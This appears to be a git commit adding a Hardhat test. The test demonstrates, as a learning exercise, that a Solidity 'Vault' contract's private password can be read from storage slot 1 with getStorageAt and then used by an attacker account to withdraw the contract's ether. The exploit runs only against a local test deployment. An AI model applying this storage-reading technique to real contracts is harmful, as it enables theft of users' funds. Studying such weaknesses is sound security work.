43fe0a656a96f3f33ad085d5016fdf2aeaffb76a
stalin_laptop <mags961224hjccmt00@gmail.com>
2022-12-11 22:09:36 -0600

    Hands on experience reading private variable's values in the blockchain
    Exploiting a contract that stores a pwd to withdraw ethers in its own storage - Retrieved the pwd from outside the blockchain and then used it to withdraw the funds from an attacker account

---
+++ test/2-Unencrypted-Data/visibility-test.js
@@ -0,0 +1,49 @@
+const { expect } = require("chai");
+const { ethers } = require("hardhat");
+
+describe("Vault", function () {
+  let deployer, attacker;
+
+  beforeEach(async function () {
+    [deployer, attacker] = await ethers.getSigners();
+
+    const Vault = await ethers.getContractFactory("Vault", deployer);
+    
+    // formatBytes32String() Returns a bytes32 string representation of text. 
+    // If the length of text exceeds 31 bytes, it will throw an error.
+    this.vault = await Vault.deploy(ethers.utils.formatBytes32String("myPassword"));
+
+    await this.vault.deposit({ value: ethers.utils.parseEther("100") });
+  });
+
+  it("Should be possible to access to its private variables", async function () {
+    const initialBalanceContract = await ethers.provider.getBalance(this.vault.address);
+    const initialBalanceAttacker = await ethers.provider.getBalance(attacker.address);
+
+    console.log("Contract's initial balance: ", ethers.utils.formatEther(initialBalanceContract.toString()));
+    console.log("Attacker's initial balance: ", ethers.utils.formatEther(initialBalanceAttacker.toString()));
+
+    // The getStorageAt() function from ethers returns the values that are stored in a contract at an specific slot
+    // Returns the Bytes32 value of the position pos at address addr, as of the blockTag.
+    // Syntax: await ethers.provider.getStorageAt(<address>, <slot>) 
+    const pwd = await ethers.provider.getStorageAt(this.vault.address, 1);
+
+    // parseBytes32String() Returns the decoded string represented by the Bytes32 encoded data.
+    const password = await ethers.utils.parseBytes32String(pwd);
+
+    console.log("================================");
+    console.log("= password: " + password + "       =");
+    console.log("================================");
+
+    await this.vault.connect(attacker).withdraw(pwd);
+
+    const finalBalanceContract = await ethers.provider.getBalance(this.vault.address);
+    const finalBalanceAttacker = await ethers.provider.getBalance(attacker.address);
+
+    console.log("Contract's final balance: ", ethers.utils.formatEther(finalBalanceContract.toString()));
+    console.log("Attacker's final balance: ", ethers.utils.formatEther(finalBalanceAttacker.toString()));
+
+    expect(finalBalanceContract).to.eq(0);
+    expect(finalBalanceAttacker).to.be.gt(initialBalanceAttacker);
+  });
+});
